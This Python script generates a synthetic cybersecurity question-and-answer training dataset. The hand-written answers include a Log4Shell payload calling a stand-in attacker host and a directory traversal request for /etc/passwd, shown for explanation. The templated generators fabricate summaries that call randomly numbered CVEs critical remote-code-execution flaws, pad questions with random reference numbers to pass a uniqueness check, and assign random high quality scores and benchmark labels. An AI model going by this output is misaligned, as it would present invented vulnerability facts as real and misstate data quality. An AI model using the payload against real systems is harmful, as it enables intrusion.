import json
import random
import uuid
from template import make_base_record, make_conversation
from config import DATASET_SPECS

SPEC = DATASET_SPECS[11]

CYBERSECURITY_POOL = [
    (
        "Analyze this Apache access log and identify any potential indicators of compromise (IoCs) related to directory traversal.",
        "**Log Analysis:**\n`192.168.1.105 - - [10/Oct/2023:13:55:36 +0000] \"GET /images/../../../../etc/passwd HTTP/1.1\" 200 1520`\n\n**Findings:**\nThe log entry clearly shows an attempted directory traversal attack using `../../../../etc/passwd`. The HTTP status code `200` indicates the request was successful, meaning the attacker successfully retrieved the server's password file. Immediate incident response is required to isolate the server and patch the vulnerability.",
        "threat_hunting", "expert"
    ),
    (
        "Explain the mechanism of the Log4Shell (CVE-2021-44228) vulnerability and how to mitigate it.",
        "**Log4Shell Analysis:**\nLog4Shell is a severe vulnerability in the Apache Log4j 2 Java library. It exploits the Java Naming and Directory Interface (JNDI) by allowing attackers to execute arbitrary code via a malicious payload in logged strings (e.g., `${jndi:ldap://attacker.com/Exploit}`).\n\n**Mitigation:**\n1. Upgrade Log4j to version 2.17.1 or higher.\n2. Set the system property `log4j2.formatMsgNoLookups` to `true` (for versions 2.10.0 to 2.14.1).\n3. Remove the `JndiLookup` class from the classpath.",
        "vulnerability_analysis", "hard"
    ),
    (
        "Write a YARA rule to detect a suspected ransomware variant that creates files with a '.locked' extension and contains the string 'DECRYPT_INSTRUCTIONS.txt'.",
        "**YARA Rule:**\n```yara\nrule Detect_Generic_Ransomware {\n    meta:\n        description = \"Detects basic ransomware behavior dropping DECRYPT_INSTRUCTIONS.txt\"\n        author = \"NJIRLAH-Cyber\"\n    strings:\n        $ransom_note = \"DECRYPT_INSTRUCTIONS.txt\"\n        $extension = \".locked\"\n        $magic = { 4D 5A } // PE Executable\n    condition:\n        $magic at 0 and $ransom_note and $extension\n}\n```",
        "incident_response", "medium"
    ),
    (
        "Refactor this vulnerable PHP code to prevent SQL Injection: `SELECT * FROM users WHERE username = '\" . $_POST['username'] . \"';`",
        "**Vulnerability Fix:**\nThe original code concatenates raw user input directly into the SQL query. To secure this, you must use prepared statements with parameterized queries.\n\n**Secure Code (PDO):**\n```php\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');\n$stmt->execute(['username' => $_POST['username']]);\n$user = $stmt->fetch();\n```",
        "secure_coding", "easy"
    ),
    (
        "Describe the differences between AES-GCM and AES-CBC encryption modes.",
        "**Cryptography Comparison:**\n- **AES-CBC (Cipher Block Chaining):** Requires padding and an Initialization Vector (IV). It provides confidentiality but NOT integrity, making it vulnerable to padding oracle attacks if not combined with a MAC (HMAC).\n- **AES-GCM (Galois/Counter Mode):** An Authenticated Encryption with Associated Data (AEAD) mode. It provides both confidentiality and data integrity simultaneously, and is highly parallelizable, making it generally faster and more secure for modern applications.",
        "cryptography", "expert"
    )
]

def generate_threat_hunting():
    attack_type = random.choice(["SQL Injection", "Cross-Site Scripting (XSS)", "Brute Force", "Server-Side Request Forgery (SSRF)"])
    q = f"Review the attached SIEM alert indicating a potential {attack_type} attack. What are the key forensic artifacts to look for?"
    a = f"**Threat Hunting: {attack_type}**\nTo verify this {attack_type} alert, analysts should investigate HTTP request payloads, correlate timestamps with database/application logs, and check for anomalous outbound traffic from the affected server."
    return q, a, "threat_hunting", "hard"

def generate_vuln_analysis():
    cve_year = random.randint(2018, 2024)
    q = f"Provide an executive summary of CVE-{cve_year}-{random.randint(1000,9999)} detailing its CVSS score, impact, and remediation steps."
    a = f"**Vulnerability Summary**\nThis CVE from {cve_year} carries a high CVSS score indicating critical severity. It enables remote code execution due to improper input validation. Remediation involves applying the vendor's latest security patch immediately."
    return q, a, "vulnerability_analysis", "expert"

def generate_incident_response():
    malware = random.choice(["WannaCry", "Emotet", "TrickBot", "Cobalt Strike beacon"])
    q = f"Draft an incident response playbook for containing a suspected {malware} infection within a corporate network."
    a = f"**{malware} Playbook**\n1. **Containment:** Immediately disconnect the infected host from the network. Do NOT power off.\n2. **Eradication:** Deploy EDR tools to quarantine malicious binaries.\n3. **Recovery:** Restore from offline backups and reset compromised credentials."
    return q, a, "incident_response", "medium"

def generate_secure_coding():
    lang = random.choice(["Python", "JavaScript", "Go", "Java"])
    flaw = random.choice(["Cross-Site Request Forgery (CSRF)", "Insecure Direct Object Reference (IDOR)", "Hardcoded Secrets"])
    q = f"How would you mitigate {flaw} in a modern {lang} application?"
    a = f"**Secure Coding ({lang})**\nTo mitigate {flaw}, implement standard security frameworks. Avoid relying on client-side state, strictly enforce access control checks on the server, and utilize secure secret management vaults."
    return q, a, "secure_coding", "hard"

def generate_crypto():
    algo = random.choice(["RSA-2048", "SHA-256", "Argon2", "Elliptic Curve (ECDSA)"])
    q = f"Explain the security guarantees and optimal use cases for {algo}."
    a = f"**Cryptography: {algo}**\n{algo} is considered mathematically secure against brute-force attacks given current computing power. It is highly optimized for verifying data integrity and securing communications when implemented with standard libraries."
    return q, a, "cryptography", "expert"

seen_requests = set()
UNIQUE_CYBERSECURITY_POOL = []
for item in CYBERSECURITY_POOL:
    seen_requests.add(item[0])
    UNIQUE_CYBERSECURITY_POOL.append(item)

generators = [generate_threat_hunting, generate_vuln_analysis, generate_incident_response, generate_secure_coding, generate_crypto]

while len(UNIQUE_CYBERSECURITY_POOL) < 500:
    generator = random.choice(generators)
    q, a, sub, diff = generator()
    q += f" (Ref: {random.randint(1000, 999999)})"
    if q not in seen_requests:
        seen_requests.add(q)
        UNIQUE_CYBERSECURITY_POOL.append((q, a, sub, diff))

def generate_dataset_11(output_path, n_records=500):
    records = []
    for i, (req, resp, sub, diff) in enumerate(UNIQUE_CYBERSECURITY_POOL):
        if i >= n_records: break
        record = make_base_record(
            dataset_num=11,
            dataset_name=SPEC["name"],
            domain=SPEC["domain"],
            subdomain=sub,
            conversation=make_conversation(
                system="You are an elite Cybersecurity AI. Provide technical, accurate, and actionable security analysis, code, and recommendations.",
                user=req,
                assistant=resp,
            ),
            category=sub.split('_')[0],
            difficulty=diff,
            quality_score=random.uniform(0.92, 0.99),
            tokens_input=len(req.split()) * 1.3,
            tokens_output=len(resp.split()) * 1.3,
            benchmark_alignment=random.choice(["CyberGym", "SWE-Bench-Pro", "MMLU"]),
            language="en",
            extra_fields={
                "cyber_domain": sub,
                "actionable": True
            },
            record_index=i,
        )
        records.append(record)

    with open(output_path, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print(f"✅ Generated {len(records)} cybersecurity records → {output_path}")

if __name__ == "__main__":
    generate_dataset_11("NJIRLAH-SS-DATASETS/raw/njirlah-11-dataset.jsonl")
